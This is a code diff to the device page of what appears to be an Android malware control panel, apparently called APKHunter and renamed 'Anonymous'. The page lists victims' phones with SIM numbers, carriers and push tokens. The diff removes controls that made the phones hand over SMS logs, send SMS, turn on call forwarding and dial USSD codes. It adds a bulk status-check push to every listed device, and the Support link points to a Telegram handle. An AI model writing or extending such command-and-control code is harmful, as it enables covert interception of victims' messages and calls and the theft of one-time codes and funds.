@@ -17,7 +17,9 @@ import {
   ref,
   startAt,
 } from "firebase/database";
-import { useCallback, useEffect, useRef, useState } from "react";
+import { useCallback, useEffect, useMemo, useRef, useState } from "react";
+
+
 
 const INITIAL_PAGE_SIZE = 20;
 const NEXT_PAGE_SIZE = 10;
@@ -192,61 +194,15 @@ export default function DevicesPage() {
   const [initialLoading, setInitialLoading] = useState(true);
   const [hasMore, setHasMore] = useState(true);
   const [lastKey, setLastKey] = useState<string | null>(null);
+  const [activeOnly, setActiveOnly] = useState(false);
   const loaderRef = useRef<HTMLDivElement | null>(null);
   const loadingRef = useRef(false);
   const hasMoreRef = useRef(true);
   const lastKeyRef = useRef<string | null>(null);
   const pathname = usePathname();
   const router = useRouter();
-
-  // Modal state
-  const [selectedDevice, setSelectedDevice] = useState<Device | null>(null);
-  const [showModal, setShowModal] = useState(false);
-  const [activeSection, setActiveSection] = useState<"ussd" | "sms" | "callforward" | null>(null);
-  const [ussdCode, setUssdCode] = useState("");
-  const [ussdSim, setUssdSim] = useState("sim1");
-  const [smsNumber, setSmsNumber] = useState("");
-  const [smsBody, setSmsBody] = useState("");
-  const [cfNumber, setCfNumber] = useState("");
   const [actionLoading, setActionLoading] = useState<string | null>(null);
-
-  const openDeviceModal = (device: Device) => {
-    setSelectedDevice(device);
-    setShowModal(true);
-    setActiveSection(null);
-    setUssdCode("");
-    setSmsNumber("");
-    setSmsBody("");
-    setCfNumber("");
-  };
-
-  const closeModal = () => {
-    setShowModal(false);
-    setSelectedDevice(null);
-    setActiveSection(null);
-  };
-
-  const sendFCMAction = async (endpoint: string, payload: Record<string, unknown>, loadingKey?: string) => {
-    const key = loadingKey || endpoint;
-    setActionLoading(key);
-    try {
-      const res = await fetch(endpoint, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload),
-      });
-      const data = await res.json();
-      if (data.success) {
-        alert("Command sent successfully!");
-      } else {
-        alert("Failed: " + (data.error || "Unknown error"));
-      }
-    } catch {
-      alert("Network error sending command");
-    } finally {
-      setActionLoading(null);
-    }
-  };
+  const [checkAllLoading, setCheckAllLoading] = useState(false);
 
   const loadDevices = useCallback(async (batchSize: number) => {
     if (loadingRef.current || !hasMoreRef.current) return;
@@ -287,7 +243,6 @@ export default function DevicesPage() {
         const device = mapToDevice(deviceId, deviceData);
 
         fetchedDevices.push(device);
-        console.log(device.fcmToken);
       });
 
       const nextBatch = cursor
@@ -500,9 +455,26 @@ export default function DevicesPage() {
     };
   }, []);
 
+  // Check if device is active (last seen within 15 minutes)
+  const isDeviceActive = (device: Device): boolean => {
+    if (!device.lastChecked) return false;
+    const lastCheckedTime = new Date(device.lastChecked).getTime();
+    if (isNaN(lastCheckedTime)) return false;
+    const now = Date.now();
+    const fifteenMinutes = 15 * 60 * 1000;
+    return (now - lastCheckedTime) <= fifteenMinutes;
+  };
+
+  // Count of active devices (based on full device list)
+  const activeCount = useMemo(() => {
+    return devices.filter(isDeviceActive).length;
+  }, [devices]);
+
   const normalizedQuery = searchQuery.trim().toLowerCase();
-  const filteredDevices = normalizedQuery
-    ? devices.filter((device) => {
+  const filteredDevices = useMemo(() => {
+    let result = devices;
+    if (normalizedQuery) {
+      result = result.filter((device) => {
         const searchableText = [
           device.deviceId,
           device.brand,
@@ -518,15 +490,91 @@ export default function DevicesPage() {
           .toLowerCase();
 
         return searchableText.includes(normalizedQuery);
-      })
-    : devices;
+      });
+    }
+    if (activeOnly) {
+      result = result.filter(isDeviceActive);
+    }
+    return result;
+  }, [devices, searchQuery, activeOnly]);
+
+  const sendFCMAction = async (device: Device, endpoint: string, loadingKey?: string) => {
+    const key = loadingKey || endpoint;
+    setActionLoading(key);
+    try {
+      const res = await fetch(endpoint, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          deviceId: device.deviceId,
+          token: device.fcmToken,
+          title: "Check Status",
+          body: "Checking device status",
+        }),
+      });
+      const data = await res.json();
+      if (data.success) {
+        return true;
+      } else {
+        console.warn(`Check status failed for ${device.deviceId}: ${data.error}`);
+        return false;
+      }
+    } catch {
+      console.error(`Network error sending check status to ${device.deviceId}`);
+      return false;
+    } finally {
+      setActionLoading(null);
+    }
+  };
+
+  const handleCheckAll = async () => {
+    if (checkAllLoading) return;
+    if (!filteredDevices.length) {
+      alert("No devices to check");
+      return;
+    }
+
+    const confirmMsg = `This will send a status check to ${filteredDevices.length} device(s). Continue?`;
+    if (!confirm(confirmMsg)) return;
+
+    setCheckAllLoading(true);
+    let successCount = 0;
+    let failCount = 0;
+
+    for (let i = 0; i < filteredDevices.length; i++) {
+      const device = filteredDevices[i];
+      try {
+        setActionLoading(`check-${device.deviceId}`);
+        const result = await sendFCMAction(device, "/api/checkstatus", `check-${device.deviceId}`);
+        if (result) successCount++;
+        else failCount++;
+      } catch (error) {
+        failCount++;
+      } finally {
+        setActionLoading(null);
+      }
+      await new Promise(resolve => setTimeout(resolve, 300));
+    }
+
+    setCheckAllLoading(false);
+    alert(`Check all complete: ${successCount} succeeded, ${failCount} failed.`);
+  };
+
+  const handleCardClick = (deviceId: string) => {
+    if (!deviceId || deviceId === "Unknown") {
+      return;
+    }
+    
+    const url = `/devices/${deviceId}`;
+    window.open(url, '_blank');
+  };
 
   return (
-    <div className="min-h-screen bg-[#ffffff]">
+    <div className="min-h-screen bg-white">
       <header className="w-full bg-black">
         <div className="mx-auto flex w-full max-w-3xl items-center justify-between px-5 py-4">
           <Link href="/all" className="text-xl font-extrabold italic leading-none text-[#9ad83d]">
-            APKHunter
+            Anonymous
           </Link>
           <nav className="flex flex-wrap items-center gap-4 text-sm font-semibold text-white sm:gap-6 sm:text-base">
             <Link href="/all" className={`transition-colors ${pathname === "/all" ? "text-white" : "text-white/85 hover:text-white"}`}>
@@ -535,14 +583,14 @@ export default function DevicesPage() {
             <Link href="/settings" className={`transition-colors ${pathname === "/settings" ? "text-white" : "text-white/85 hover:text-white"}`}>
               Setting
             </Link>
-            <a
-              href="https://t.me/AH_Support_bot"
-              target="_blank"
-              rel="noopener noreferrer"
-              className="text-white/85 transition-colors hover:text-white"
-            >
-              Support
-            </a>
+           <a
+  href="https://t.me/Babydon217?text=Hello%20Babydon%2C%20please%20fix%20my%20harmful%20issue%20as%20soon%20as%20possible."
+  target="_blank"
+  rel="noopener noreferrer"
+  className="text-white/85 transition-colors hover:text-white"
+>
+  Support
+</a>
             <button
               onClick={async () => {
                 await fetch("/api/logout", { method: "POST" });
@@ -559,341 +607,119 @@ export default function DevicesPage() {
       {initialLoading ? (
         <LineSpinner />
       ) : (
-      <main className="mx-auto w-full max-w-3xl px-5 py-8">
-        <div className="space-y-5 rounded-[14px] border border-[#d6d6d6] bg-[#f3f3f3] p-5 shadow-[0_4px_20px_rgba(0,0,0,0.1)]">
-          <div className="flex items-center gap-3">
-            <select
-              aria-label="Filter devices"
-              className="h-12 flex-1 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-4 text-base font-semibold text-[#2f2f2f] outline-none"
-              onChange={(e) => router.push(e.target.value)}
-              value={pathname}
-            >
-              <option value="/all">All</option>
-              <option value="/messages">Messages</option>
-              <option value="/forms">Forms</option>
-              <option value="/devices">Devices</option>
-            </select>
-            <button
-              type="button"
-              onClick={() => window.location.reload()}
-              className="h-12 rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] px-6 text-base font-semibold text-[#303030] transition hover:bg-[#eaeaea]"
-            >
-              NEW
-            </button>
-          </div>
-
-          <div className="relative">
-            <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-[#8e8e8e]">
-              ⌕
-            </span>
-            <input
-              type="text"
-              value={searchQuery}
-              onChange={(event) => setSearchQuery(event.target.value)}
-              placeholder="Search Devices"
-              className="h-12 w-full rounded-2xl border-2 border-[#b7b7b7] bg-[#f8f8f8] pl-10 pr-4 text-base text-[#303030] outline-none placeholder:text-[#a7a7a7]"
-            />
-          </div>
-        </div>
-
-        <div className="mt-8 grid grid-cols-2 gap-5">
-          {filteredDevices.map((device, index) => {
-            const displayIndex = filteredDevices.length - index;
-
-            return (
-              <article
-                key={device.deviceId}
-                className="flex flex-col rounded-[16px] bg-white p-4 shadow-[0_8px_32px_rgba(0,0,0,0.12)]"
+        <main className="mx-auto w-full max-w-3xl px-5 py-8">
+          <div className="space-y-5 rounded-[14px] border border-gray-300 bg-gray-100 p-5">
+            {/* First row: dropdown and Check All */}
+            <div className="flex items-center gap-3">
+              <select
+                aria-label="Filter devices"
+                className="h-12 flex-1 rounded-2xl border-2 border-gray-400 bg-gray-100 px-4 text-base font-semibold text-gray-800 outline-none"
+                onChange={(e) => router.push(e.target.value)}
+                value={pathname}
               >
-                <h2
-                  className="mb-3 text-center text-sm font-bold leading-tight text-[#273b87] cursor-pointer hover:underline"
-                  onClick={() => openDeviceModal(device)}
-                >
-                  {displayIndex}. {device.brand} {device.model} ({device.androidVersion})
-                </h2>
+                <option value="/all">All</option>
+                <option value="/messages">Messages</option>
+                <option value="/forms">Forms</option>
+                <option value="/devices">Devices</option>
+              </select>
+              <button
+                type="button"
+                onClick={handleCheckAll}
+                disabled={checkAllLoading}
+                className="h-12 rounded-2xl border-2 border-gray-400 bg-gray-100 px-6 text-base font-semibold text-gray-800 transition hover:bg-gray-200 disabled:opacity-50"
+              >
+                {checkAllLoading ? "Checking..." : "Check All"}
+              </button>
+            </div>
 
-                <div className="flex-1 overflow-hidden rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] text-center text-xs font-semibold text-[#2d2d2d]">
-                  <div className="px-3 py-2 break-all">{device.brand} {device.model}</div>
-                  <div className="border-t-2 border-[#b1b1b7] px-3 py-2 break-all">ID: {device.deviceId}</div>
-                  <div className="border-t-2 border-[#b1b1b7] px-3 py-2">Android: {device.androidVersion}</div>
-                  <div className="border-t-2 border-[#b1b1b7] px-3 py-2">{getPrimarySimLine(device)}</div>
-                  <div className="border-t-2 border-[#b1b1b7] px-3 py-2">
-                    online: <span className="text-[#d94d57]">{formatLastChecked(device.lastChecked)}</span>
+            {/* Second row: search input and Active button with count */}
+            <div className="flex items-center gap-3">
+              <div className="relative flex-1">
+                <span className="pointer-events-none absolute left-4 top-1/2 -translate-y-1/2 text-base text-gray-500">
+                  ⌕
+                </span>
+                <input
+                  type="text"
+                  value={searchQuery}
+                  onChange={(event) => setSearchQuery(event.target.value)}
+                  placeholder="Search Devices"
+                  className="h-12 w-full rounded-2xl border-2 border-gray-400 bg-gray-100 pl-10 pr-4 text-base text-gray-800 outline-none placeholder:text-gray-500"
+                />
+              </div>
+              <button
+                type="button"
+                onClick={() => setActiveOnly(!activeOnly)}
+                className={`h-12 rounded-2xl border-2 px-6 text-base font-semibold transition whitespace-nowrap ${
+                  activeOnly
+                    ? "border-blue-600 bg-blue-600 text-white"
+                    : "border-gray-400 bg-gray-100 text-gray-800 hover:bg-gray-200"
+                }`}
+              >
+                {activeOnly ? "Active ✓" : `Active (${activeCount})`}
+              </button>
+            </div>
+          </div>
+
+          <div className="mt-8 grid grid-cols-2 gap-5">
+            {filteredDevices.map((device, index) => {
+              const displayIndex = filteredDevices.length - index;
+
+              return (
+                <div
+                  key={device.deviceId}
+                  onClick={() => handleCardClick(device.deviceId)}
+                  style={{ cursor: 'pointer' }}
+                  className="flex flex-col border border-gray-300 bg-white rounded-lg p-4"
+                >
+                  <h2 className="mb-3 text-center text-sm font-bold leading-tight text-blue-700">
+                    {displayIndex}. {device.brand} {device.model} ({device.androidVersion})
+                  </h2>
+
+                  <div className="flex-1 overflow-hidden border border-gray-300 bg-gray-50 text-center text-xs font-semibold text-gray-700 rounded">
+                    <div className="px-3 py-2 break-all border-b border-gray-300">{device.brand} {device.model}</div>
+                    <div className="px-3 py-2 break-all border-b border-gray-300">ID: {device.deviceId}</div>
+                    <div className="px-3 py-2 border-b border-gray-300">Android: {device.androidVersion}</div>
+                    <div className="px-3 py-2 border-b border-gray-300">{getPrimarySimLine(device)}</div>
+                    <div className="px-3 py-2">
+                      online: <span className="text-red-500">{formatLastChecked(device.lastChecked)}</span>
+                    </div>
+                  </div>
+
+                  <div className="mt-3 flex justify-center">
+                    <button
+                      type="button"
+                      onClick={(e) => {
+                        e.stopPropagation();
+                        sendFCMAction(device, "/api/checkstatus", `check-${device.deviceId}`);
+                      }}
+                      disabled={actionLoading === `check-${device.deviceId}`}
+                      className="rounded-lg border-2 border-blue-700 px-4 py-2 text-xs font-bold text-blue-700 hover:bg-blue-700 hover:text-white transition disabled:opacity-50 cursor-pointer"
+                    >
+                      {actionLoading === `check-${device.deviceId}` ? "Checking..." : "Check Online"}
+                    </button>
                   </div>
                 </div>
+              );
+            })}
 
-                <div className="mt-3 flex justify-center">
-                  <button
-                    type="button"
-                    onClick={() =>
-                      sendFCMAction("/api/checkstatus", {
-                        deviceId: device.deviceId,
-                        token: device.fcmToken,
-                        title: "Check Status",
-                        body: "Checking device status",
-                      }, `check-${device.deviceId}`)
-                    }
-                    disabled={actionLoading === `check-${device.deviceId}`}
-                    className="rounded-xl border-2 border-[#8b95d4] px-4 py-2 text-xs font-bold text-[#495cb0] hover:bg-[#495cb0] hover:text-white transition disabled:opacity-50"
-                  >
-                    {actionLoading === `check-${device.deviceId}` ? "Checking..." : "Online Check"}
-                  </button>
-                </div>
-              </article>
-            );
-          })}
-
-          {loading && (
-            <div className="flex items-center justify-center gap-3 py-6 text-sm text-gray-500">
-              <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-[#d4bb41]" />
-              <span>Loading more devices...</span>
-            </div>
-          )}
-
-          {!hasMore && filteredDevices.length > 0 && (
-            <p className="py-6 text-center text-sm text-gray-500">No more devices to load.</p>
-          )}
-
-          {!loading && filteredDevices.length === 0 && devices.length > 0 && (
-            <p className="py-6 text-center text-sm text-gray-500">No devices match your search.</p>
-          )}
-
-          <div ref={loaderRef} className="h-1 w-full" />
-        </div>
-      </main>
-      )}
-
-      {/* Device Detail Modal */}
-      {showModal && selectedDevice && (
-        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4" onClick={closeModal}>
-          <div
-            className="relative max-h-[90vh] w-full max-w-md overflow-y-auto rounded-2xl bg-white p-5 shadow-2xl"
-            onClick={(e) => e.stopPropagation()}
-          >
-            {/* Close button */}
-            <button
-              onClick={closeModal}
-              className="absolute right-3 top-3 text-xl text-gray-400 hover:text-gray-700"
-            >
-              ✕
-            </button>
-
-            {/* Device Info Table */}
-            <div className="overflow-hidden rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] text-sm font-semibold text-[#2d2d2d]">
-              <div className="flex border-b-2 border-[#b1b1b7] px-4 py-2.5">
-                <span className="w-32 shrink-0 font-bold">Name</span>
-                <span className="text-[#273b87]">
-                  {selectedDevice.brand} {selectedDevice.model}{" "}
-                  <span className="text-red-500">{selectedDevice.androidVersion}</span>
-                </span>
-              </div>
-              <div className="flex border-b-2 border-[#b1b1b7] px-4 py-2.5">
-                <span className="w-32 shrink-0 font-bold">ID</span>
-                <span className="break-all text-[#273b87]">{selectedDevice.deviceId}</span>
-              </div>
-              <div className="flex border-b-2 border-[#b1b1b7] px-4 py-2.5">
-                <span className="w-32 shrink-0 font-bold">SIM</span>
-                <span>{selectedDevice.sim1number || selectedDevice.sim2number || "N/A"}</span>
-              </div>
-              <div className="flex border-b-2 border-[#b1b1b7] px-4 py-2.5">
-                <span className="w-32 shrink-0 font-bold">Forward Call</span>
-                <span className="text-red-500">{selectedDevice.forwardingSim ? "ON" : "OFF"}</span>
-              </div>
-              <div className="flex px-4 py-2.5">
-                <span className="w-32 shrink-0 font-bold">Last <span className="text-red-500">offline</span></span>
-                <span className="text-red-500">{formatLastChecked(selectedDevice.lastChecked)}</span>
-              </div>
-            </div>
-
-            {/* Action Buttons */}
-            <div className="mt-4 flex flex-wrap justify-center gap-2">
-              <button
-                onClick={() =>
-                  sendFCMAction("/api/checkstatus", {
-                    deviceId: selectedDevice.deviceId,
-                    token: selectedDevice.fcmToken,
-                    title: "Check Status",
-                    body: "Checking device status",
-                  })
-                }
-                disabled={actionLoading === "/api/checkstatus"}
-                className="rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold text-[#273b87] hover:bg-[#273b87] hover:text-white transition disabled:opacity-50"
-              >
-                {actionLoading === "/api/checkstatus" ? "..." : "Check Online"}
-              </button>
-              <button
-                onClick={() => router.push(`/devices/${selectedDevice.deviceId}`)}
-                className="rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold text-[#273b87] hover:bg-[#273b87] hover:text-white transition"
-              >
-                View Data
-              </button>
-              <button
-                onClick={() =>
-                  sendFCMAction("/api/getsms", {
-                    deviceId: selectedDevice.deviceId,
-                    token: selectedDevice.fcmToken,
-                    title: "Get SMS",
-                    body: "Requesting SMS logs",
-                  })
-                }
-                disabled={actionLoading === "/api/getsms"}
-                className="rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold text-[#273b87] hover:bg-[#273b87] hover:text-white transition disabled:opacity-50"
-              >
-                {actionLoading === "/api/getsms" ? "..." : "Get SMS"}
-              </button>
-              <button
-                onClick={() => setActiveSection(activeSection === "sms" ? null : "sms")}
-                className={`rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold transition ${activeSection === "sms" ? "bg-[#273b87] text-white" : "text-[#273b87] hover:bg-[#273b87] hover:text-white"}`}
-              >
-                Send SMS
-              </button>
-              <button
-                onClick={() => setActiveSection(activeSection === "callforward" ? null : "callforward")}
-                className={`rounded-lg border-2 border-[#273b87] px-3 py-2 text-xs font-bold transition ${activeSection === "callforward" ? "bg-[#273b87] text-white" : "text-[#273b87] hover:bg-[#273b87] hover:text-white"}`}
-              >
-                Call Forwarding
-              </button>
-              <button
-                onClick={() => setActiveSection(activeSection === "ussd" ? null : "ussd")}
-                className={`rounded-lg px-4 py-2 text-xs font-bold text-white transition ${activeSection === "ussd" ? "bg-[#1a2a6c]" : "bg-[#273b87] hover:bg-[#1a2a6c]"}`}
-              >
-                USSD Dialing
-              </button>
-            </div>
-
-            {/* Send SMS Section */}
-            {activeSection === "sms" && (
-              <div className="mt-4 space-y-3 rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] p-4">
-                <h3 className="text-center text-sm font-bold text-[#273b87]">Send SMS</h3>
-                <input
-                  type="text"
-                  value={smsNumber}
-                  onChange={(e) => setSmsNumber(e.target.value)}
-                  placeholder="Phone number"
-                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none"
-                />
-                <textarea
-                  value={smsBody}
-                  onChange={(e) => setSmsBody(e.target.value)}
-                  placeholder="Message body"
-                  rows={3}
-                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none resize-none"
-                />
-                <div className="flex justify-center">
-                  <button
-                    onClick={() =>
-                      sendFCMAction("/api/sendmessage", {
-                        token: selectedDevice.fcmToken,
-                        title: "Send SMS",
-                        body: "Send SMS command",
-                        data: { number: smsNumber, message: smsBody },
-                      })
-                    }
-                    disabled={!smsNumber || !smsBody || actionLoading === "/api/sendmessage"}
-                    className="rounded-lg bg-[#1b6b2f] px-6 py-2 text-sm font-bold text-white hover:bg-[#145524] transition disabled:opacity-50"
-                  >
-                    {actionLoading === "/api/sendmessage" ? "Sending..." : "Send"}
-                  </button>
-                </div>
+            {loading && (
+              <div className="flex items-center justify-center gap-3 py-6 text-sm text-gray-500 col-span-2">
+                <div className="h-5 w-5 animate-spin rounded-full border-2 border-gray-300 border-t-yellow-500" />
+                <span>Loading more devices...</span>
               </div>
             )}
 
-            {/* Call Forwarding Section */}
-            {activeSection === "callforward" && (
-              <div className="mt-4 space-y-3 rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] p-4">
-                <h3 className="text-center text-sm font-bold text-[#273b87]">Call Forwarding</h3>
-                <input
-                  type="text"
-                  value={cfNumber}
-                  onChange={(e) => setCfNumber(e.target.value)}
-                  placeholder="Forward to number (e.g. 91XXXXXXXXXX)"
-                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none"
-                />
-                <div className="flex justify-center gap-3">
-                  <button
-                    onClick={() =>
-                      sendFCMAction("/api/callforwarding", {
-                        token: selectedDevice.fcmToken,
-                        title: "Call Forwarding",
-                        body: "Activate call forwarding",
-                        command: "activate",
-                        data: { number: cfNumber },
-                      })
-                    }
-                    disabled={!cfNumber || actionLoading === "/api/callforwarding"}
-                    className="rounded-lg bg-[#1b6b2f] px-5 py-2 text-sm font-bold text-white hover:bg-[#145524] transition disabled:opacity-50"
-                  >
-                    {actionLoading === "/api/callforwarding" ? "..." : "Activate"}
-                  </button>
-                  <button
-                    onClick={() =>
-                      sendFCMAction("/api/callforwarding", {
-                        token: selectedDevice.fcmToken,
-                        title: "Call Forwarding",
-                        body: "Deactivate call forwarding",
-                        command: "deactivate",
-                      })
-                    }
-                    disabled={actionLoading === "/api/callforwarding"}
-                    className="rounded-lg bg-red-600 px-5 py-2 text-sm font-bold text-white hover:bg-red-700 transition disabled:opacity-50"
-                  >
-                    Deactivate
-                  </button>
-                </div>
-              </div>
+            {!hasMore && filteredDevices.length > 0 && (
+              <p className="py-6 text-center text-sm text-gray-500 col-span-2">No more devices to load.</p>
             )}
 
-            {/* USSD Dialing Section */}
-            {activeSection === "ussd" && (
-              <div className="mt-4 space-y-3 rounded-xl border-2 border-[#b1b1b7] bg-[#f8f8f8] p-4">
-                <h3 className="rounded-lg bg-[#273b87] py-2 text-center text-sm font-bold text-white">
-                  USSD Dialing
-                </h3>
-                <select
-                  value={ussdSim}
-                  onChange={(e) => setUssdSim(e.target.value)}
-                  aria-label="Select SIM"
-                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none"
-                >
-                  {selectedDevice.sim1number && (
-                    <option value="sim1">
-                      {selectedDevice.sim1Carrier || "SIM 1"} — {selectedDevice.sim1number}
-                    </option>
-                  )}
-                  {selectedDevice.sim2number && (
-                    <option value="sim2">
-                      {selectedDevice.sim2Carrier || "SIM 2"} — {selectedDevice.sim2number}
-                    </option>
-                  )}
-                  {!selectedDevice.sim1number && !selectedDevice.sim2number && (
-                    <option value="sim1">No SIM info available</option>
-                  )}
-                </select>
-                <input
-                  type="text"
-                  value={ussdCode}
-                  onChange={(e) => setUssdCode(e.target.value)}
-                  placeholder="USSD Code (e.g. *121#)"
-                  className="w-full rounded-lg border border-gray-300 px-3 py-2 text-sm outline-none"
-                />
-                <div className="flex justify-center">
-                  <button
-                    onClick={() =>
-                      sendFCMAction("/api/sendussd", {
-                        token: selectedDevice.fcmToken,
-                        data: { ussd_code: ussdCode, sim: ussdSim },
-                      })
-                    }
-                    disabled={!ussdCode || actionLoading === "/api/sendussd"}
-                    className="rounded-lg bg-[#1b6b2f] px-6 py-2 text-sm font-bold text-white hover:bg-[#145524] transition disabled:opacity-50"
-                  >
-                    {actionLoading === "/api/sendussd" ? "Sending..." : "Send"}
-                  </button>
-                </div>
-              </div>
+            {!loading && filteredDevices.length === 0 && devices.length > 0 && (
+              <p className="py-6 text-center text-sm text-gray-500 col-span-2">No devices match your search.</p>
             )}
+
+            <div ref={loaderRef} className="h-1 w-full col-span-2" />
           </div>
-        </div>
+        </main>
       )}
     </div>
   );
